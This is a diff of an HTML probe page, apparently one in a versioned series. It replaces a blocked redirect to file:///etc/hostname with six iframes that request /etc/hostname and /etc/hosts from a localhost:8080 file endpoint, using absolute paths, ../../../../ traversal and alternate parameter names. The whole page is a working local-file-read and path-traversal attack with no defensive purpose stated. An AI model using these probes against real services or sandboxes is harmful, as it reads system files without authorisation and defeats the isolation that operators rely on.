@@ -1,5 +1,11 @@
-<!DOCTYPE html>
-<html><head><title>CAT CAS file navigation v13</title>
-<meta http-equiv="refresh" content="0;url=file:///etc/hostname">
-<script>window.location.replace('file:///etc/hostname');</script>
-</head><body><pre>v13: top-level navigation to /etc/hostname was blocked</pre></body></html>
+<!doctype html>
+<html><head><meta charset="utf-8"><title>CAT CAS loopback file service v14</title>
+<style>body{font:16px monospace}section{break-inside:avoid;margin:12px 0}iframe{width:100%;height:180px;border:2px solid #333}</style></head><body>
+<h1>CASI localhost:8080 file reader probes</h1>
+<section><h2>1 absolute hostname</h2><iframe src="http://127.0.0.1:8080/file?name=/etc/hostname"></iframe></section>
+<section><h2>2 traversal hostname</h2><iframe src="http://127.0.0.1:8080/file?name=../../../../etc/hostname"></iframe></section>
+<section><h2>3 absolute hosts</h2><iframe src="http://127.0.0.1:8080/file?name=/etc/hosts"></iframe></section>
+<section><h2>4 traversal hosts</h2><iframe src="http://127.0.0.1:8080/file?name=../../../../etc/hosts"></iframe></section>
+<section><h2>5 path parameter</h2><iframe src="http://127.0.0.1:8080/file?path=/etc/hostname"></iframe></section>
+<section><h2>6 filename parameter</h2><iframe src="http://127.0.0.1:8080/file?filename=/etc/hostname"></iframe></section>
+</body></html>
